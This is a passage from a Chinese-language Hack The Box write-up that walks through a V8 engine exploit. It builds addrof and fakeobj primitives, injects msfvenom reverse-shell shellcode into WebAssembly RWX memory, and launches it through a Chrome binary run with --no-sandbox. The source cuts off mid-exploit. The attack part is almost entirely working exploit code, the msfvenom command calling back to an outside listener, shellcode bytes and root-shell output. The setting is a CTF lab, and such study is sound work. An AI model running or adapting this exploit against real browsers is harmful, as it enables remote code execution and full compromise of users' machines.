+<figure class="highlight bash" data-code="cm9vdEBsdWNpOn4vdjhidWlsZC92OC9vdXQuZ24veDY0LnJlbGVhc2UjIC4vZDggL3Jvb3QvdjhidWlsZC9yb3BlMi94cGwuanMgClsqXSBGbG9hdCBhcnJheSBtYXAgICA6ICAweDgyNDE5MDkKWypdIFJlZ3VsYXIgYXJyYXkgbWFwIDogIDB4ODI0MTg2OQpbK10gQ29udHJvbGxlZCBSVyBoZWxwZXIgYWRkcmVzczogMHg4MDg3MzNkClsrXSBXYXNtIGluc3RhbmNlIGFkZHJlc3M6IDB4ODIxMTYzMQpbKl0gUldYIElOU1RBTkNFOiAgIDB4MTMyMTFlNTBjMDAwClsrXSBBcnJheUJ1ZmZlciBhZGRyZXNzOiAweDgwODdhODUKWytdIEJhY2sgc3RvcmUgcG9pbnRlcjogMHg1NWI3MGE5ZDQ3MzAKWytdIFNwYXduaW5nIGEgc2hlbGwuLi4K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/v8/out.gn/x64.release<span class="comment"># ./d8 /root/v8build/rope2/xpl.js </span></span><br><span class="line">[*] Float array map   :  0x8241909</span><br><span class="line">[*] Regular array map :  0x8241869</span><br><span class="line">[+] Controlled RW helper address: 0x808733d</span><br><span class="line">[+] Wasm instance address: 0x8211631</span><br><span class="line">[*] RWX INSTANCE:   0x13211e50c000</span><br><span class="line">[+] ArrayBuffer address: 0x8087a85</span><br><span class="line">[+] Back store pointer: 0x55b70a9d4730</span><br><span class="line">[+] Spawning a shell...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb167.jpg"></li>
+</ul>
+<figure class="highlight bash" data-code="4pSM4pSA4pSAKHJvb3Twn5KAa2FsaSktW34vdGVzdF0K4pSU4pSAIyBuYyAtbHZwIDQyMjIKTmNhdDogVmVyc2lvbiA3LjkxICggaHR0cHM6Ly9ubWFwLm9yZy9uY2F0ICkKTmNhdDogTGlzdGVuaW5nIG9uIDo6OjQyMjIKTmNhdDogTGlzdGVuaW5nIG9uIDAuMC4wLjA6NDIyMgpOY2F0OiBDb25uZWN0aW9uIGZyb20gMTkyLjE2OC4xNzcuMTUxLgpOY2F0OiBDb25uZWN0aW9uIGZyb20gMTkyLjE2OC4xNzcuMTUxOjQ3MDcyLgppZAp1aWQ9MChyb290KSBnaWQ9MChyb290KSBncm91cHM9MChyb290KQp3aG9hbWkKcm9vdAp1bmFtZSAtYQpMaW51eCBsdWNpIDQuMTUuMC0xMzItZ2VuZXJpYyAjMTM2fjE2LjA0LjEtVWJ1bnR1IFNNUCBUdWUgSmFuIDEyIDE4OjIyOjIwIFVUQyAyMDIxIHg4Nl82NCB4ODZfNjQgeDg2XzY0IEdOVS9MaW51eAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/test]</span><br><span class="line">└─<span class="comment"># nc -lvp 4222</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4222</span><br><span class="line">Ncat: Listening on 0.0.0.0:4222</span><br><span class="line">Ncat: Connection from 192.168.177.151.</span><br><span class="line">Ncat: Connection from 192.168.177.151:47072.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux luci 4.15.0-132-generic <span class="comment">#136~16.04.1-Ubuntu SMP Tue Jan 12 18:22:20 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb168.jpg"></li>
+</ul>
+<p>在d8上有效,必须试试之前从端口8000下载的chrome二进制文件,运行攻击测试,制作一个HTML文件包含xpl.js文件,这里的想法是使用–no-sandbox最终意味着没有沙箱逃逸是和系统上执行的所有JIT代码HTML文件本身:</p>
+<figure class="highlight bash" data-code="PGh0bWw+CiAgICA8aGVhZD4KICAgICAgIDxzY3JpcHQgc3JjPSJ4cGwuanMiPjwvc2NyaXB0PgogICAgPC9oZWFkPgo8L2h0bWw+Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">       &lt;script src=<span class="string">&quot;xpl.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行给定的chrome二进制文件:.&#x2F;chrome&#x2F;chrome –no-sandbox .&#x2F;xpl.html会反弹一个reverse shell:</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb169.jpg"></li>
+</ul>
+<figure class="highlight bash" data-code="4pSM4pSA4pSAKHJvb3Twn5KAa2FsaSktW34vdGVzdF0K4pSU4pSAIyBuYyAtbHZwIDQyMjIKTmNhdDogVmVyc2lvbiA3LjkxICggaHR0cHM6Ly9ubWFwLm9yZy9uY2F0ICkKTmNhdDogTGlzdGVuaW5nIG9uIDo6OjQyMjIKTmNhdDogTGlzdGVuaW5nIG9uIDAuMC4wLjA6NDIyMgpOY2F0OiBDb25uZWN0aW9uIGZyb20gMTkyLjE2OC4xNzcuMTUxLgpOY2F0OiBDb25uZWN0aW9uIGZyb20gMTkyLjE2OC4xNzcuMTUxOjU0NzUwLgppZAp1aWQ9MChyb290KSBnaWQ9MChyb290KSBncm91cHM9MChyb290KQp3aG9hbWkKcm9vdAp1bmFtZSAtYQpMaW51eCBsdWNpIDQuMTUuMC0xMzItZ2VuZXJpYyAjMTM2fjE2LjA0LjEtVWJ1bnR1IFNNUCBUdWUgSmFuIDEyIDE4OjIyOjIwIFVUQyAyMDIxIHg4Nl82NCB4ODZfNjQgeDg2XzY0IEdOVS9MaW51eAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/test]</span><br><span class="line">└─<span class="comment"># nc -lvp 4222</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4222</span><br><span class="line">Ncat: Listening on 0.0.0.0:4222</span><br><span class="line">Ncat: Connection from 192.168.177.151.</span><br><span class="line">Ncat: Connection from 192.168.177.151:54750.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux luci 4.15.0-132-generic <span class="comment">#136~16.04.1-Ubuntu SMP Tue Jan 12 18:22:20 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用成功</p>
+<p>现在，先把这个放在一边，首先重新更改ip地址然后生成shellcode，使用这个漏洞来获得reverse shell，最终的漏洞利用js脚本看起来像这样:</p>
+<figure class="highlight bash" data-code="bXNmdmVub20gLXAgbGludXgveDY0L3NoZWxsX3JldmVyc2VfdGNwIExIT1NUPTEwLjEwLjE0LjEyIExQT1JUPTQyMjIgLWYgbnVtCgoweDZhLCAweDI5LCAweDU4LCAweDk5LCAweDZhLCAweDAyLCAweDVmLCAweDZhLCAweDAxLCAweDVlLCAweDBmLCAweDA1LCAweDQ4LCAweDk3LCAweDQ4LCAKMHhiOSwgMHgwMiwgMHgwMCwgMHgxMCwgMHg3ZSwgMHgwYSwgMHgwYSwgMHgwZSwgMHgwYywgMHg1MSwgMHg0OCwgMHg4OSwgMHhlNiwgMHg2YSwgMHgxMCwgCjB4NWEsIDB4NmEsIDB4MmEsIDB4NTgsIDB4MGYsIDB4MDUsIDB4NmEsIDB4MDMsIDB4NWUsIDB4NDgsIDB4ZmYsIDB4Y2UsIDB4NmEsIDB4MjEsIDB4NTgsIAoweDBmLCAweDA1LCAweDc1LCAweGY2LCAweDZhLCAweDNiLCAweDU4LCAweDk5LCAweDQ4LCAweGJiLCAweDJmLCAweDYyLCAweDY5LCAweDZlLCAweDJmLCAKMHg3MywgMHg2OCwgMHgwMCwgMHg1MywgMHg0OCwgMHg4OSwgMHhlNywgMHg1MiwgMHg1NywgMHg0OCwgMHg4OSwgMHhlNiwgMHgwZiwgMHgwNQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4222 -f num</span><br><span class="line"></span><br><span class="line">0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, </span><br><span class="line">0xb9, 0x02, 0x00, 0x10, 0x7e, 0x0a, 0x0a, 0x0e, 0x0c, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, </span><br><span class="line">0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, </span><br><span class="line">0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, </span><br><span class="line">0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>xpl.js</li>
+</ul>
+<figure class="highlight bash" data-code="dmFyIGZsb2F0X2FyciA9IFsxLjEsIDIuMiwgMy4zLCA0LjQsIDUuNV07CnZhciBvYmogPSB7IkEiOjEuMX07CnZhciByZWcgPSBbMSwgMiwgMywgNF07CgoKdmFyIGJ1ZiA9IG5ldyBBcnJheUJ1ZmZlcig4KTsgLy8gOCBieXRlIGFycmF5IGJ1ZmZlcgp2YXIgZjY0X2J1ZiA9IG5ldyBGbG9hdDY0QXJyYXkoYnVmKTsKdmFyIHU2NF9idWYgPSBuZXcgVWludDMyQXJyYXkoYnVmKTsKCmZ1bmN0aW9uIGZ0b2kodmFsLCBzaXplKSB7CgogICAgZjY0X2J1ZlswXSA9IHZhbDsKCiAgICBpZihzaXplID09IDMyKSB7CiAgICAgICAgcmV0dXJuIEJpZ0ludCh1NjRfYnVmWzBdKTsKICAgIH0gZWxzZSBpZihzaXplID09IDY0KSB7CiAgICAgICAgcmV0dXJuIEJpZ0ludCh1NjRfYnVmWzBdKSArIChCaWdJbnQodTY0X2J1ZlsxXSkgPDwgMzJuKTsKICAgIH0KCn0KCmZ1bmN0aW9uIGl0b2YodmFsLCBzaXplKSB7CgogICAgaWYoc2l6ZSA9PSAzMikgewogICAgICAgIHU2NF9idWZbMF0gPSBOdW1iZXIodmFsICYgMHhmZmZmZmZmZm4pOwogICAgfSBlbHNlIGlmKHNpemUgPT0gNjQpIHsKICAgICAgICB1NjRfYnVmWzBdID0gTnVtYmVyKHZhbCAmIDB4ZmZmZmZmZmZuKTsKICAgICAgICB1NjRfYnVmWzFdID0gTnVtYmVyKHZhbCA+PiAzMm4pOwogICAgfQoKICAgIHJldHVybiBmNjRfYnVmWzBdOwoKfQoKCnZhciBmbG9hdF9hcnJfbWFwID0gZnRvaShmbG9hdF9hcnIuR2V0TGFzdEVsZW1lbnQoKSwgMzIpCnZhciByZWdfYXJyX21hcCA9IGZsb2F0X2Fycl9tYXAgLSAweGEwbjsKCmNvbnNvbGUubG9nKCJbKl0gRmxvYXQgYXJyYXkgbWFwICAgOiAgMHgiICsgZmxvYXRfYXJyX21hcC50b1N0cmluZygxNikpOwpjb25zb2xlLmxvZygiWypdIFJlZ3VsYXIgYXJyYXkgbWFwIDogIDB4IiArIHJlZ19hcnJfbWFwLnRvU3RyaW5nKDE2KSk7CgoKZnVuY3Rpb24gYWRkcm9mKGluX29iaikgewoJZmxvYXRfYXJyLlNldExhc3RFbGVtZW50KGl0b2YocmVnX2Fycl9tYXAsIDMyKSk7CglmbG9hdF9hcnJbMF0gPSBpbl9vYmo7CglmbG9hdF9hcnIuU2V0TGFzdEVsZW1lbnQoaXRvZihmbG9hdF9hcnJfbWFwLCAzMikpOwoJbGV0IGFkZHIgPSBmbG9hdF9hcnJbMF07CglyZXR1cm4gZnRvaShhZGRyLCA2NCkKfQoKCmZ1bmN0aW9uIGZha2VvYmooYWRkcikgewoJZmxvYXRfYXJyWzBdID0gaXRvZihhZGRyLCAzMik7CglmbG9hdF9hcnIuU2V0TGFzdEVsZW1lbnQoaXRvZihyZWdfYXJyX21hcCwgMzIpKTsKCWxldCBmYWtlID0gZmxvYXRfYXJyWzBdOwoJZmxvYXRfYXJyLlNldExhc3RFbGVtZW50KGl0b2YoZmxvYXRfYXJyX21hcCwgMzIpKTsKCXJldHVybiBmYWtlOwp9Cgp2YXIgcndfaGVscGVyID0gW2l0b2YoZmxvYXRfYXJyX21hcCwgNjQpLCAxLjEsIDIuMiwgMy4zXTsKdmFyIHJ3X2hlbHBlcl9hZGRyID0gYWRkcm9mKHJ3X2hlbHBlcikgJiAweGZmZmZmZmZmbjsKCmNvbnNvbGUubG9nKCJbK10gQ29udHJvbGxlZCBSVyBoZWxwZXIgYWRkcmVzczogMHgiICsgcndfaGVscGVyX2FkZHIudG9TdHJpbmcoMTYpKTsKCmZ1bmN0aW9uIGFyYl9yZWFkKGFkZHIpIHsKICAgIGxldCBmYWtlID0gZmFrZW9iaihyd19oZWxwZXJfYWRkciAtIDB4MjBuKTsKICAgIHJ3X2hlbHBlclsxXSA9IGl0b2YoKDB4OG4gPDwgMzJuKSArIGFkZHIgLSAweDhuLCA2NCk7CiAgICByZXR1cm4gZnRvaShmYWtlWzBdLCA2NCk7Cn0KCmZ1bmN0aW9uIGFyYl93cml0ZShhZGRyLCB2YWx1ZSkgewogICAgbGV0IGZha2UgPSBmYWtlb2JqKHJ3X2hlbHBlcl9hZGRyIC0gMHgyMG4pOwogICAgcndfaGVscGVyWzFdID0gaXRvZigoMHg4biA8PCAzMm4pICsgYWRkciAtIDB4OG4sIDY0KTsKICAgIGZha2VbMF0gPSBpdG9mKHZhbHVlLCA2NCk7Cn0KCnZhciB3YXNtQ29kZSA9IG5ldyBVaW50OEFycmF5KFswLDk3LDExNSwxMDksMSwwLDAsMCwxLDEzMywxMjgsMTI4LDEyOCwwLDEsOTYsMCwxLDEyNywzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTMwLDEyOCwxMjgsMTI4LDAsMSwwLDQsMTMyLDEyOCwxMjgsMTI4LDAsMSwxMTIsMCwwLDUsMTMxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTI4LDEyOCwxMjgsMCwxLDAsMSw2LDEyOSwxMjgsMTI4LDEyOCwwLDAsNywxNDUsMTI4LDEyOCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDEyOCwwLDIsNiwxMDksMTAxLDEwOSwxMTEsMTE0LDEyMSwyLDAsNCwxMDksOTcsMTA1LDExMCwwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMCwxMCwxMzgsMTI4LDEyOCwxMjgsMCwxLDEzMiwxMjgsMTI4LDEyOCwwLDAsNjUsMCwxMV0pOwp2YXIgd2FzbV9tb2R1bGUgPSBuZXcgV2ViQXNzZW1ibHkuTW9kdWxlKHdhc21Db2RlKTsKdmFyIHdhc21faW5zdGFuY2UgPSBuZXcgV2ViQXNzZW1ibHkuSW5zdGFuY2Uod2FzbV9tb2R1bGUpOwp2YXIgcHduID0gd2FzbV9pbnN0YW5jZS5leHBvcnRzLm1haW47Cgp2YXIgd2FzbV9pbnN0YW5jZV9hZGRyID0gYWRkcm9mKHdhc21faW5zdGFuY2UpICYgMHhmZmZmZmZmZm47CnZhciByd3ggPSBhcmJfcmVhZCh3YXNtX2luc3RhbmNlX2FkZHIgKyAweDY4biAmIDB4ZmZmZmZmZmZuKTsKCmNvbnNvbGUubG9nKCJbK10gV2FzbSBpbnN0YW5jZSBhZGRyZXNzOiAweCIgKyB3YXNtX2luc3RhbmNlX2FkZHIudG9TdHJpbmcoMTYpKTsKCmNvbnNvbGUubG9nKCJbKl0gUldYIElOU1RBTkNFOiAgIDB4IiArIHJ3eC50b1N0cmluZygxNikpOwoKCnZhciBhcnJfYnVmID0gbmV3IEFycmF5QnVmZmVyKDB4MTAwKTsKdmFyIGRhdGF2aWV3ID0gbmV3IERhdGFWaWV3KGFycl9idWYpOwoKdmFyIGFycl9idWZfYWRkciA9IGFkZHJvZihhcnJfYnVmKSAmIDB4ZmZmZmZmZmZuOzsKdmFyIGJhY2tfc3RvcmVfYWRkciA9IGFyYl9yZWFkKGFycl9idWZfYWRkciArIDB4MTRuKTsKCmNvbnNvbGUubG9nKCJbK10gQXJyYXlCdWZmZXIgYWRkcmVzczogMHgiICsgYXJyX2J1Zl9hZGRyLnRvU3RyaW5nKDE2KSk7CmNvbnNvbGUubG9nKCJbK10gQmFjayBzdG9yZSBwb2ludGVyOiAweCIgKyBiYWNrX3N0b3JlX2FkZHIudG9TdHJpbmcoMTYpKTsKCmFyYl93cml0ZShhcnJfYnVmX2FkZHIgKyAweDE0biwgcnd4KTsKCnZhciBzaGVsbGNvZGUgPSBbCiAgICAweDZhLCAweDI5LCAweDU4LCAweDk5LCAweDZhLCAweDAyLCAweDVmLCAweDZhLCAweDAxLCAweDVlLCAweDBmLCAweDA1LCAweDQ4LCAweDk3LCAweDQ4LCAKICAgIDB4YjksIDB4MDIsIDB4MDAsIDB4MTAsIDB4N2UsIDB4MGEsIDB4MGEsIDB4MGUsIDB4MGMsIDB4NTEsIDB4NDgsIDB4ODksIDB4ZTYsIDB4NmEsIDB4MTAsIAogICAgMHg1YSwgMHg2YSwgMHgyYSwgMHg1OCwgMHgwZiwgMHgwNSwgMHg2YSwgMHgwMywgMHg1ZSwgMHg0OCwgMHhmZiwgMHhjZSwgMHg2YSwgMHgyMSwgMHg1OCwgCiAgICAweDBmLCAweDA1LCAweDc1LCAweGY2LCAweDZhLCAweDNiLCAweDU4LCAweDk5LCAweDQ4LCAweGJiLCAweDJmLCAweDYyLCAweDY5LCAweDZlLCAweDJmLCAKICAgIDB4NzMsIDB4NjgsIDB4MDAsIDB4NTMsIDB4NDgsIDB4ODksIDB4ZTcsIDB4NTIsIDB4NTcsIDB4NDgsIDB4ODksIDB4ZTYsIDB4MGYsIDB4MDUKXTsgIC8vIHNoZWxsY29kZSBmb3Igc3Bhd25pbmcgYSByZXZlcnNlIHNoZWxsCgpmb3IgKGxldCBpID0gMDsgaSA8IHNoZWxsY29kZS5sZW5ndGg7IGkrKykgewogIGRhdGF2aWV3LnNldFVpbnQ4KGksIHNoZWxsY29kZVtpXSwgdHJ1ZSk7Cn0KCmNvbnNvbGUubG9nKCJbK10gU3Bhd25pbmcgYSBzaGVsbC4uLiIpOwpwd24oKTsK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];</span><br><span class="line">var obj = &#123;<span class="string">&quot;A&quot;</span>:1.1&#125;;</span><br><span class="line">var reg = [1, 2, 3, 4];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(8); // 8 byte array buffer</span><br><span class="line">var f64_buf = new Float64Array(buf);</span><br><span class="line">var u64_buf = new Uint32Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> ftoi(val, size) &#123;</span><br><span class="line"></span><br><span class="line">    f64_buf[0] = val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == 32) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(size == 64) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; <span class="string">32n);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function itof(val, size) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(size == 32) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">    &#125; else if(size == 64) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">        u64_buf[1] = Number(val &gt;&gt; 32n</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> f64_buf[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var float_arr_map = ftoi(float_arr.GetLastElement(), 32)</span><br><span class="line">var reg_arr_map = float_arr_map - 0xa0n;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] Float array map   :  0x&quot;</span> + float_arr_map.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[*] Regular array map :  0x&quot;</span> + reg_arr_map.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> addrof(in_obj) &#123;</span><br><span class="line">	float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">	float_arr[0] = in_obj;</span><br><span class="line">	float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">	<span class="built_in">let</span> addr = float_arr[0];</span><br><span class="line">	<span class="built_in">return</span> ftoi(addr, 64)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> fakeobj(addr) &#123;</span><br><span class="line">	float_arr[0] = itof(addr, 32);</span><br><span class="line">	float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">	<span class="built_in">let</span> fake = float_arr[0];</span><br><span class="line">	float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">	<span class="built_in">return</span> fake;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];</span><br><span class="line">var rw_helper_addr = addrof(rw_helper) &amp; 0xffffffffn;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] Controlled RW helper address: 0x&quot;</span> + rw_helper_addr.toString(16));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> arb_read(addr) &#123;</span><br><span class="line">    <span class="built_in">let</span> fake = fakeobj(rw_helper_addr - 0x20n);</span><br><span class="line">    rw_helper[1] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    return ftoi(fake[<span class="number">0</span>], <span class="number">64</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arb_write(addr, value) &#123;</span><br><span class="line">    let fake = fakeobj(rw_helper_addr - <span class="number">0</span>x20n);</span><br><span class="line">    rw_helper[<span class="number">1</span>] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(value, <span class="number">64</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var wasmCode = new Uint8Array([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,</span><br><span class="line">                               <span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,</span><br><span class="line">                               <span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">                               <span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,</span><br><span class="line">                               <span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line">var wasm_module = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_module);</span><br><span class="line">var pwn = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line">var wasm_instance_addr = addrof(wasm_instance) &amp; <span 